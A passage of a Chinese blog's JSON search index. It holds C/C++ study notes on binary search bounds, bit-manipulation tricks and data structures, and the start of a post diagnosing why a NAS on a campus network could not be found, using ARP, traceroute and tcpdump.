{\n  bool operator() (const T&amp; x, const T&amp; y) const {return x&gt;y;}\n  typedef T first_argument_type;\n  typedef T second_argument_type;\n  typedef bool result_type;\n};\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u590d\u6742\u7c7b\u578b-comp-\u5b9a\u4e49","title":"\u590d\u6742\u7c7b\u578b comp \u5b9a\u4e49","text":"<pre><code>vector&lt;vector&lt;int&gt;&gt; &amp;fruits;\n\n// lower_bound \u548c upper_bound \u81ea\u5b9a\u4e49&lt;\u65f6\u53c2\u6570\u4e0d\u4e00\u6837\u3002\nauto compare_fruit1 = [](vector&lt;int&gt; &amp;a, int val){\n    return a[0] &lt; val;\n};\nauto compare_fruit2 = [](int val, vector&lt;int&gt; &amp;a){\n    return val &lt; a[0];\n};\n\nint start_ge_min = lower_bound(fruits.begin(), fruits.end(), startPos, compare_fruit1) - fruits.begin();\nint start_le_max = upper_bound(fruits.begin(), fruits.end(), startPos, compare_fruit2) - fruits.begin() - 1;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#lower_boundupper_bound\u5b9e\u73b0","title":"lower_bound/upper_bound\u5b9e\u73b0","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u542b\u4e49\u603b\u7ed3","title":"\u542b\u4e49\u603b\u7ed3","text":"<ul> <li>\u9012\u589e\u5e8f\u5217\uff08\u975e\u9012\u51cf\uff09<ul> <li>lower_bound\uff0c\u8fd4\u56de&gt;= val \u7684\u6700\u5c0f\u7d22\u5f15</li> <li>upper_bound\uff0c\u8fd4\u56de&gt;val \u7684\u6700\u5c0f\u7d22\u5f15</li> </ul> </li> <li>\u9012\u51cf\u5e8f\u5217<ul> <li>lower_bound\uff0c\u8fd4\u56de&lt;= val \u7684\u6700\u5c0f\u7d22\u5f15</li> <li>upper_bound\uff0c\u8fd4\u56de&lt;val \u7684\u6700\u5c0f\u7d22\u5f15 \u5373\uff1a</li> </ul> </li> <li>lower_bound\uff0c\u8fd4\u56de\u6392\u5e8f\u5728 val \u81ea\u8eab\u53ca\u53f3\u4fa7\u5143\u7d20\u7684\u6700\u5c0f\u7d22\u5f15</li> <li>upper_bound\uff0c\u8fd4\u56de\u6392\u5e8f\u5728 val \u53f3\u4fa7\u5143\u7d20\u7684\u6700\u5c0f\u7d22\u5f15</li> <li>\u6839\u636e\u9012\u589e\u548c\u9012\u51cf\uff0c\u4f20\u5165<code>&lt;</code>\u6216<code>&gt;</code>\u6bd4\u8f83\u7b26\u53f7\u3002\u4e0d\u80fd\u4f20\u5165\u542b\u7b49\u4e8e\u7684\u6bd4\u8f83\u7b26\u53f7\uff0c\u5426\u5219 lower_bound \u548c upper_bound \u542b\u4e49\u4e92\u6362\u3002</li> <li>cmp \u51fd\u6570\u8fd4\u56de true\uff0c\u8868\u793a\u524d\u4e00\u4e2a\u5143\u7d20\u5e94\u8be5\u51fa\u73b0\u5728\u540e\u4e00\u4e2a\u5143\u7d20\u5de6\u4fa7\u3002\u611f\u89c9\u6ca1\u6709\u4ec0\u4e48\u60c5\u51b5\u662f\u9700\u8981\u7528\u5230 cmp \u5305\u542b\u7b49\u4e8e\u60c5\u51b5\u7684\u3002</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5b9e\u73b0\u89c4\u5f8b\u603b\u7ed3","title":"\u5b9e\u73b0\u89c4\u5f8b\u603b\u7ed3","text":"<ul> <li>right \u8981\u66f4\u65b0\u6c38\u8fdc\u90fd\u662f\u66f4\u65b0\u4e3a mid</li> <li>left \u6839\u636e\u53cd\u9762\u60c5\u51b5\u66f4\u65b0\u4e3a mid+1<ul> <li>\u9012\u589e\u5e8f\u5217\uff1a<ul> <li>lower_bound \u53cd\u9762\u60c5\u51b5\u4e3a\uff1amid &lt; val\uff0c\u6545<code>if (comp(*it,val))</code></li> <li>upper_bound \u53cd\u9762\u60c5\u51b5\u4e3a\uff1amid &lt;= val, \u6545\u53ea\u7528\u5c0f\u4e8e\u53f7\u8868\u793a\u4e3a<code>if (!comp(val,*it))</code></li> </ul> </li> <li>\u9012\u51cf\u5e8f\u5217\uff1a<ul> <li>lower_boundf \u53cd\u9762\u60c5\u51b5\u4e3a\uff1amid &gt; val\uff0c\u6545<code>if (comp(*it,val))</code></li> <li>upper_bound \u53cd\u9762\u60c5\u51b5\u4e3a\uff1amid &gt;= val\uff0c\u6545\u53ea\u7528\u5927\u4e8e\u53f7\u8868\u793a\u4e3a`if (!comp(val,*it))</li> </ul> </li> </ul> </li> </ul> <ul> <li>\u8fd4\u56de\u7684\u7d22\u5f15\u5728<code>[0, n]</code>\uff0c\u5f53\u53d6\u5230 n \u65f6\u8868\u793a\u7b26\u5408\u6761\u4ef6\u7684\u6ca1\u627e\u5230\u3002</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5b9e\u73b0","title":"\u5b9e\u73b0","text":"<p>\u611f\u89c9\u5728 T \u662f\u57fa\u672c\u7c7b\u578b\uff0c&lt;\u53f7\u5f88\u660e\u786e\u7684\u60c5\u51b5\u4e0b\uff0clower_bound \u548c upper_bound \u9700\u8981\u5b9a\u4e49\u4e0d\u540c\u7684\u51fd\u6570\u5c31\u6bd4\u8f83\u53cd\u76f4\u89c9\u3002</p> <ul> <li>\u53ef\u4ee5\u628a Compare \u51fd\u6570\u6362\u6210 get \u51fd\u6570\uff0c\u8fd9\u6837\u53d8\u6210<code>get(\\*it) &lt; val</code></li> </ul> <pre><code>template &lt;class ForwardIterator, class T&gt;\n  ForwardIterator lower_bound (ForwardIterator first, ForwardIterator last, const T&amp; val)\n{\n  ForwardIterator it;\n  iterator_traits&lt;ForwardIterator&gt;::difference_type count, step;\n  count = distance(first,last);\n  while (count&gt;0)\n  {\n    it = first; step=count/2; advance (it,step);\n    if (*it&lt;val) {                 // or: if (comp(*it,val)), for version (2)\n      first=++it;\n      count-=step+1;\n    }\n    else count=step;\n  }\n  return first;\n}\n\ntemplate &lt;class ForwardIterator, class T&gt;\n  ForwardIterator upper_bound (ForwardIterator first, ForwardIterator last, const T&amp; val)\n{\n  ForwardIterator it;\n  iterator_traits&lt;ForwardIterator&gt;::difference_type count, step;\n  count = std::distance(first,last);\n  while (count&gt;0)\n  {\n    it = first; step=count/2; std::advance (it,step);\n    if (!(val&lt;*it))                 // or: if (!comp(val,*it)), for version (2)\n      { first=++it; count-=step+1;  }\n    else count=step;\n  }\n  return first;\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u52a8\u6001\u89c4\u5212","title":"\u52a8\u6001\u89c4\u5212","text":"<p>\u56fe\u89e3\u52a8\u6001\u89c4\u5212\u7684\u89e3\u9898\u56db\u6b65\u9aa4\uff08C++/Java/Python\uff09 - \u6253\u5bb6\u52ab\u820d - \u529b\u6263\uff08LeetCode\uff09</p> <ul> <li>\u5b9a\u4e49\u5b50\u95ee\u9898</li> <li>\u5199\u51fa\u5b50\u95ee\u9898\u7684\u9012\u63a8\u5173\u7cfb</li> <li>\u786e\u5b9a DP \u6570\u7ec4\u7684\u8ba1\u7b97\u987a\u5e8f</li> <li>\u7a7a\u95f4\u4f18\u5316\uff08\u53ef\u9009\uff09</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u4f4d\u8fd0\u7b97","title":"\u4f4d\u8fd0\u7b97","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>\u5206\u4eab\uff5c\u4ece\u96c6\u5408\u8bba\u5230\u4f4d\u8fd0\u7b97\uff0c\u5e38\u89c1\u4f4d\u8fd0\u7b97\u6280\u5de7\u5206\u7c7b\u603b\u7ed3\uff01 - \u529b\u6263\uff08LeetCode\uff09</p> <pre><code>(1&lt;&lt;n) - 1  //\u5f97\u5230 n \u4f4d\u8fde\u7eed\u7684 1\nx &amp; (-x)   // \u627e\u51fa x \u7684\u4e8c\u8fdb\u5236\u8868\u793a\u4e2d\u7684\u6700\u4f4e\u4f4d\u7684 1 \u7684\u4f4d\u7f6e\uff0c\u5f97\u5230\u7684\u503c\u9664\u8be5\u4f4d\u5916\u5168 0\nx &amp; (x - 1) //\u5c06 x \u6700\u4f4e\u4f4d\u7684 1 \u7f6e\u4e3a 0\n</code></pre> <ul> <li>x &amp; (-x) \u539f\u7406\u5728\u4e8e-x \u662f\u8865\u7801\uff0c\u8fdb\u884c\u5bf9 x \u53d6\u53cd +1 \u64cd\u4f5c\u3002\u4e8c\u8fdb\u5236\u4e0a\uff0c\u53ef\u4ee5\u603b\u7ed3\u51fa\u53d8\u5316\u89c4\u5f8b\uff1a\u6700\u4f4e\u4f4d 1 \u4e0d\u53d8\uff0c\u5de6\u4fa7\u5168\u90e8\u53d6\u53cd\u3002\u56e0\u6b64\u4e0e\u540e\uff0c\u53ea\u6709\u6700\u4f4e\u4f4d 1 \u4fdd\u6301\u4e0d\u53d8\uff0c\u5176\u5b83\u5168\u4e3a 0.</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#gospers-hack","title":"Gosper's hack","text":"<pre><code>void GospersHack(int k, int n)\n{\n    int set = (1 &lt;&lt; k) - 1;\n    int limit = (1 &lt;&lt; n);\n    while (set &lt; limit)\n    {\n        DoStuff(set);\n\n        // Gosper's hack:\n        int c = set &amp; - set;\n        int r = set + c;\n        set = (((r ^ set) &gt;&gt; 2) / c) | r;\n    }\n}\n</code></pre> <p>ProgrammingForInsomniacs: Gosper's Hack Explained</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#popcount","title":"popcount","text":"<pre><code>unsigned int popcount64(unsigned long long x)\n{\n    x = (x &amp; 0x5555555555555555ULL) + ((x &gt;&gt; 1) &amp; 0x5555555555555555ULL);\n    x = (x &amp; 0x3333333333333333ULL) + ((x &gt;&gt; 2) &amp; 0x3333333333333333ULL);\n    x = (x &amp; 0x0F0F0F0F0F0F0F0FULL) + ((x &gt;&gt; 4) &amp; 0x0F0F0F0F0F0F0F0FULL);\n    return (x * 0x0101010101010101ULL) &gt;&gt; 56;\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#clz-ctz","title":"clz, ctz","text":"<p>\u8ba1\u7b97\u5934\u5c3e 0 \u7684\u4e2a\u6570</p> <ul> <li>clz(count leading zero)</li> <li>ctz(count trailing zero)</li> </ul> <p>https://stackoverflow.com/a/34687453</p> <ul> <li>x86 BSF(bit scan forward)\uff1a\u00a0least significant set bit (1 bit)</li> <li>x86 BSR(bit scan reverse)\uff1a\u83b7\u5f97 most significant set bit (1 bit) index\u3002\u6ce8\u610f\uff0c\u5982\u679c src \u4e3a 0\uff0c\u5219\u8fd4\u56de\u503c\u672a\u5b9a\u4e49\u3002<ul> <li>BSR \u2014 Bit Scan Reverse (felixcloutier.com)</li> </ul> </li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u500d\u589e","title":"\u500d\u589e","text":"<pre><code>    int getKthAncestor(int node, int k) {\n        int p = 0;\n        while(k){\n            if(k&amp;1){\n                node = getAncestorPower2(node, p);\n                if(node==-1){\n                    return -1;\n                }\n            }\n            p++;\n            k&gt;&gt;=1;\n        }\n        return node;\n    }\n</code></pre> <pre><code>//https://leetcode.cn/problems/kth-ancestor-of-a-tree-node/solution/mo-ban-jiang-jie-shu-shang-bei-zeng-suan-v3rw/\n    int getKthAncestor(int node, int k) {\n        int m = 32 - __builtin_clz(k); // k \u7684\u4e8c\u8fdb\u5236\u957f\u5ea6\n        for (int i = 0; i &lt; m; i++) {\n            if ((k &gt;&gt; i) &amp; 1) { // k \u7684\u4e8c\u8fdb\u5236\u4ece\u4f4e\u5230\u9ad8\u7b2c i \u4f4d\u662f 1\n                node = pa[node][i];\n                if (node &lt; 0) break;\n            }\n        }\n        return node;\n    }\n\n    // \u53e6\u4e00\u79cd\u5199\u6cd5\uff0c\u4e0d\u65ad\u53bb\u6389 k \u7684\u6700\u4f4e\u4f4d\u7684 1\n    int getKthAncestor2(int node, int k) {\n        for (; k &amp;&amp; node != -1; k &amp;= k - 1) // k &amp; (k-1)\n            node = pa[node][__builtin_ctz(k)];\n        return node;\n    }\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5e38\u7528\u51fd\u6570","title":"\u5e38\u7528\u51fd\u6570","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7f16\u8bd1\u5668\u5185\u7f6e\u51fd\u6570","title":"\u7f16\u8bd1\u5668\u5185\u7f6e\u51fd\u6570","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u4f4d\u8fd0\u7b97_1","title":"\u4f4d\u8fd0\u7b97","text":"<p>GUN GCC \u5185\u7f6e\u51fd\u6570</p> <pre><code>__builtin_popcount = int\n__builtin_popcountl = long int\n__builtin_popcountll = long long\n\n\n__builtin_clz   # countl_zero\n__builtin_ctz   # countr_zero\n\n__builtin_clzll\n</code></pre> <p>c++ 20 \u5747\u53d8\u4e3a\u6807\u51c6\u51fd\u6570</p> <ul> <li>leetcode \u76ee\u524d\u8fd8\u65e0\u6cd5\u4f7f\u7528</li> </ul> <p>popcount</p> <pre><code>template&lt;\u00a0class\u00a0T\u00a0&gt;  \nconstexpr\u00a0int\u00a0popcount(\u00a0T x\u00a0)\u00a0noexcept;\n</code></pre> <ul> <li>countl_zero</li> <li>countr_zero</li> <li>countl_one</li> <li>countr_one</li> </ul> <pre><code>popcount( 00000000 ) = 0\npopcount( 11111111 ) = 8\npopcount( 00011101 ) = 4\n\ncountl_zero( 00000000 ) = 8\ncountl_zero( 11111111 ) = 0\ncountl_zero( 11110000 ) = 0\ncountl_zero( 00011110 ) = 3\n\ncountr_zero( 00000000 ) = 8\ncountr_zero( 11111111 ) = 0\ncountr_zero( 00011100 ) = 2\ncountr_zero( 00011101 ) = 0\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#lg","title":"lg","text":"<ul> <li>bit_width = 1 + floor(log2(x)),  0 when x = 0</li> <li>floor(log2(x)) = bit_width - 1,      max k, 2^k &lt;= x</li> <li>int: bit_width = 32 - countl_zero(x)</li> </ul> <p>c++20</p> <pre><code>template&lt;\u00a0class\u00a0T\u00a0&gt;  \nconstexpr\u00a0int\u00a0bit_width(\u00a0T x\u00a0)\u00a0noexcept;\n</code></pre> <pre><code>__lg\n\n\nbit_width = 32 - __builtin_clz(x);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u9ed1\u9b54\u6cd5","title":"\u9ed1\u9b54\u6cd5","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5404\u79cd\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784","title":"\u5404\u79cd\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#deque","title":"deque","text":"<p>\u548c vector \u4e00\u6837\uff0c\u652f\u6301\u968f\u673a\u8bbf\u95ee\u3002\u4f46\u662f\u53c8\u53ef\u4ee5\u5728\u5934\u90e8\u63d2\u5165\u5220\u9664\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u7279\u6027\uff0c\u5e95\u5c42\u5b9e\u73b0\u6bd4\u8f83\u590d\u6742\u3002 cplusplus.com/reference/deque/deque/ \u9002\u7528\uff1a</p> <ul> <li>\u5bf9\u4e8e\u975e\u5e38\u957f\u7684\u5e8f\u5217\uff0creallocations \u5f00\u9500\u5f88\u5927\uff0c\u56e0\u6b64\u6bd4 vector \u66f4\u9002\u5408\u3002</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#sortedlistorder-statistic-tree","title":"SortedList/order statistic tree","text":"<ul> <li>C++ tree find_by_order: C++ STL: Policy based data structures - Codeforces</li> <li>python sorted list: Sorted List \u2014 Sorted Containers 2.4.0 documentation (grantjenks.com)</li> </ul> <p>\u4f7f\u7528 pb_ds \u7684 tree - \u6ed1\u52a8\u5b50\u6570\u7ec4\u7684\u7f8e\u4e3d\u503c - \u529b\u6263\uff08LeetCode\uff09 \u6a21\u62df - \u6ed1\u52a8\u5b50\u6570\u7ec4\u7684\u7f8e\u4e3d\u503c - \u529b\u6263\uff08LeetCode\uff09</p> <p>Order Statistic Tree \u2013 Morse (zheolong.github.io)</p> <ul> <li>Select(i) \u2014\u2014 \u67e5\u627e\u6811\u4e2d\u7684\u7b2c_i_\u4e2a\u6700\u5c0f\u5143\u7d20\uff1b</li> <li>Rank(x) \u2014\u2014 \u67e5\u627e\u5143\u7d20_x_\u5728\u6811\u4e2d\u7684\u6b21\u5e8f\u3002</li> </ul> <p>\u5220\u9664 heap \u4e2d\u6307\u5b9a\u5143\u7d20\uff1a</p> <ul> <li>\u65b9\u6cd5\u4e00\uff1a\u7ef4\u62a4\u4e00\u4e2a delete set\uff0c\u6709\u70b9\u50cf lazy remove</li> <li>\u65b9\u6cd5\u4e8c\uff1anode based prior queue How to remove an arbitrary element from a standard heap in c++? - Stack Overflow</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#cc-error-prone","title":"C/C++ error prone","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#ieee754","title":"IEEE754","text":"<p>\u8868\u793a</p> <ul> <li>sign: s</li> <li>significand: M</li> <li>exponet: E</li> </ul> \\[ (-1)^s M 2 ^ E \\] <p>\u4f4d\u6570</p> <ul> <li>float(32): 1 + 8 + 23</li> <li>double(64): 1 + 11 + 52</li> <li>extend(80), intel: 1  + 15  + 64</li> </ul> <p>\u533a\u95f4\u8868\u793a\uff1a</p> <ul> <li>normailized: exp \u4e0d\u5168\u4e3a 0 \u6216 1<ul> <li>\u5168 0 </li> </ul> </li> </ul>","tags":["C","C++"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/","title":"NAS \u65e0\u6cd5\u626b\u63cf\u5230\u6d89\u53ca\u7684\u7f51\u7edc\u77e5\u8bc6","text":"","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>tsj \u7684 NAS \u63d2\u5899\u4e0a\u7f51\u53e3\uff0c\u7b14\u8bb0\u672c\u540c\u6837\u63d2\u5899\u4e0a\u7f51\u53e3\uff0c\u7136\u540e\u4f7f\u7528 NAS \u5b98\u65b9\u5de5\u5177\u626b\u63cf\u4e0d\u5230\u8bbe\u5907\u3002\u7531\u4e8e\u626b\u63cf\u4e0d\u5230\u8bbe\u5907\u6240\u4ee5\u4e0d\u77e5\u9053\u8bbe\u5907 ip\uff0c\u4e5f\u5c31\u65e0\u6cd5\u8fdb\u4e00\u6b65\u914d\u7f6e\u3002</p> <p>\u90a3\u4e48\u662f\u4ec0\u4e48\u539f\u56e0\u5bfc\u81f4\u626b\u63cf\u4e0d\u5230\u5462\uff0c\u7167\u7406\u6765\u8bf4\uff0cNAS \u548c\u7b14\u8bb0\u672c\u5e94\u8be5\u63a5\u5728\u540c\u4e00\u4e2a\u4ea4\u6362\u673a\u4e0b\uff0c\u7406\u5e94\u662f\u4e92\u901a\u7684\u3002\u5728\u7814\u7a76\u8be5\u95ee\u9898\u8fc7\u7a0b\u4e2d\uff0c\u67e5\u7f3a\u8865\u6f0f\u4e86\u5f88\u591a\u7f51\u7edc\u77e5\u8bc6\uff0c\u7279\u8bb0\u5f55\u3002</p> <p>\u7591\u95ee\u4e00\uff1a\u5b66\u6821\u4e3a\u4f55\u63d2\u5728\u76f8\u90bb\u5899\u4e0a\u7684\u7f51\u53e3\u7684\u673a\u5668\u5206\u914d\u5230\u4e0d\u540c\u7f51\u6bb5\u7684 ip\uff1f\u6bd4\u5982 114.xxx \u548c 210.xxx \u7591\u95ee\u4e8c\uff1a\u5bbf\u820d\u8def\u7531\u5668\u67e5\u770b wan \u53e3\u90bb\u5c45\u8868\uff0c\u4e3a\u4f55\u4e0d\u540c ip \u7684 mac \u5730\u5740\u662f\u76f8\u540c\u7684\uff1f</p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#\u7591\u95ee\u4e00\u5b66\u6821\u4e3a\u4f55\u63d2\u5728\u76f8\u90bb\u5899\u4e0a\u7684\u7f51\u53e3\u7684\u673a\u5668\u5206\u914d\u5230\u4e0d\u540c\u7f51\u6bb5\u7684-ip\u6bd4\u5982-114xxx-\u548c-210xxx","title":"\u7591\u95ee\u4e00\uff1a\u5b66\u6821\u4e3a\u4f55\u63d2\u5728\u76f8\u90bb\u5899\u4e0a\u7684\u7f51\u53e3\u7684\u673a\u5668\u5206\u914d\u5230\u4e0d\u540c\u7f51\u6bb5\u7684 ip\uff1f\u6bd4\u5982 114.xxx \u548c 210.xxx","text":"<p>\u9996\u5148\u601d\u8003\u4e0d\u540c\u7f51\u6bb5\u548c\u4f4d\u4e8e\u540c\u4e00\u4e2a\u4ea4\u6362\u673a\u4e0b\u51b2\u7a81\u5417\uff1f</p> <p>\u5176\u5b9e\u4e0d\u51b2\u7a81\uff0c\u539f\u56e0\u662f ip \u662f\u4e09\u5c42\u7684\u6982\u5ff5\uff0c\u53ea\u8981 ip \u5305\u80fd\u591f\u6b63\u786e\u9001\u5230\u76ee\u7684\u5730\u5740\u5373\u53ef\uff0c\u5e76\u4e0d\u5173\u5fc3\u5e95\u5c42\u662f\u76f4\u63a5\u53d1\u9001\u7684\uff0c\u8fd8\u662f\u7ecf\u8fc7\u8def\u7531\u7684\uff08\u7ecf\u8fc7\u8def\u7531\u65f6\u6bcf\u4e00\u8df3 mac \u5730\u5740\u90fd\u4f1a\u53d8\u5316\uff09</p> <p>\u8bbe\u5907\u8bbf\u95ee\u76f8\u540c\u7f51\u6bb5\u548c\u4e0d\u540c\u7f51\u6bb5\u5730\u5740\u65f6\u7684\u884c\u4e3a\u662f\u4e0d\u540c\u7684</p> <ul> <li>\u76f8\u540c\u7f51\u6bb5\u65f6\uff0c\u7cfb\u7edf\u901a\u5e38\u5df2\u7ecf\u6709\u8be5\u7f51\u6bb5\u7684\u8def\u7531\u4e86\uff0c\u56e0\u6b64\u4f1a\u5c1d\u8bd5\u5f80\u5bf9\u5e94\u63a5\u53e3\u53d1\u9001 arp \u8bf7\u6c42\uff0c\u8bf7\u6c42\u76ee\u7684\u5730\u5740\u7684 mac \u5730\u5740\u3002arp \u8bf7\u6c42\u6210\u529f\u540e\uff0c\u5219\u5f80\u5bf9\u5e94\u63a5\u53e3\u53d1\u9001\u62a5\u6587\uff0c\u5982\u679c arp \u5931\u8d25\uff08\u6bd4\u5982\u7aef\u53e3\u9694\u79bb\u65f6\uff09\uff0c\u5219\u4f1a icmp \u62a5\u9519\u3002</li> <li>\u5982\u679c\u4f4d\u4e8e\u4e0d\u540c\u7f51\u6bb5\uff0c\u5219\u4f1a\u5339\u914d\u9ed8\u8ba4\u8def\u7531\u3002\u6b64\u65f6\u8bbe\u5907\u9700\u8981\u5c06\u5305\u53d1\u9001\u7ed9\u7f51\u5173\u8f6c\u53d1\uff0c\u56e0\u6b64\u5b9e\u9645\u4f1a\u53d1\u9001 arp \u8bf7\u6c42\u7f51\u5173\u7684 mac \u5730\u5740</li> </ul> <p>\u867d\u7136\u7f51\u6bb5\u4e0d\u540c\uff0c\u5bfc\u81f4\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u65e0\u6cd5\u76f4\u63a5\u76f8\u4e92\u8bbf\u95ee\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u8def\u7531\u8868\uff0c\u4f7f\u5f97\u5b83\u4eec\u76f4\u63a5\u76f8\u4e92\u8bbf\u95ee\u3002</p> <p>\u9996\u5148\u53ef\u4ee5\u6d4b\u8bd5\u4e24\u4e2a\u8bbe\u5907\u786e\u5b9e\u5c5e\u4e8e\u4e00\u4e2a\u5e7f\u64ad\u57df\uff0c\u5982\u53d1\u9001 arp \u8bf7\u6c42\u662f\u53ef\u4ee5\u5f97\u5230\u54cd\u5e94\u7684\u3002</p> <pre><code>root@op1 \u279c  ~ arping -I br-wan  202.38.78.82\nARPING 202.38.78.82 from 114.214.236.72 br-wan\nUnicast reply from 202.38.78.82 [00:11:32:B2:3F:D9]  0.897ms\nUnicast reply from 202.38.78.82 [00:11:32:B2:3F:D9]  0.827ms\n</code></pre> <p>\u4f46\u662f\u7531\u4e8e\u4e0d\u4f4d\u4e8e\u76f8\u540c\u7f51\u6bb5\uff0c\u6240\u4ee5\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8bbf\u95ee\u9700\u8981\u7ecf\u8fc7\u4e09\u5c42\u8f6c\u53d1\u3002</p> <pre><code>root@op1 \u279c  ~ traceroute 202.38.78.82\ntraceroute to 202.38.78.82 (202.38.78.82), 30 hops max, 46 byte packets\n 1  114.214.236.254 (114.214.236.254)  0.427 ms  0.361 ms  0.354 ms\n 2  202.38.78.82 (202.38.78.82)  0.353 ms  0.253 ms  0.235 ms\n</code></pre> <p>\u63a5\u7740\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u6dfb\u52a0\u8def\u7531\u8868\uff0c\u8fd9\u91cc\u4e0d\u6307\u5b9a via \u8868\u793a\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5e7f\u64ad\u57df</p> <pre><code>root@op1 \u279c  ~ ip ro add 202.38.78.82 dev br-wan\n</code></pre> <p>\u7136\u540e\u518d\u5c1d\u8bd5 ping 202.38.78.82\u3002\u53ef\u4ee5\u6293\u53d6\u5230\u8bbe\u5907\u9996\u5148\u5c1d\u8bd5\u83b7\u5f97 202.38.78.82 \u7684 mac \u5730\u5740\uff0c\u53d1\u51fa arp \u8bf7\u6c42</p> <pre><code>root@op1 \u279c  ~ tcpdump -e -ni br-wan arp and ether host 00:16:3e:e2:4e:72\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on br-wan, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n17:53:21.197964 00:16:3e:e2:4e:72 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 42: Request who-has 202.38.78.82 tell 114.214.236.72, length 28\n17:53:21.198395 00:11:32:b2:3f:d9 &gt; 00:16:3e:e2:4e:72, ethertype ARP (0x0806), length 60: Reply 202.38.78.82 is-at 00:11:32:b2:3f:d9, length 46\n</code></pre> <p>\u83b7\u5f97 mac \u5730\u5740\u540e\uff0c\u8bbe\u5907\u76f4\u63a5\u76f4\u63a5\u53d1\u9001\u7ed9\u5bf9\u5e94\u8bbe\u5907\uff08\u76ee\u7684 mac \u662f\u8bbe\u5907\uff0c\u800c\u4e0d\u662f\u7f51\u5173\uff09</p> <ul> <li>\u8fd9\u91cc\u6709\u610f\u601d\u7684\u662f reply \u7684 src mac 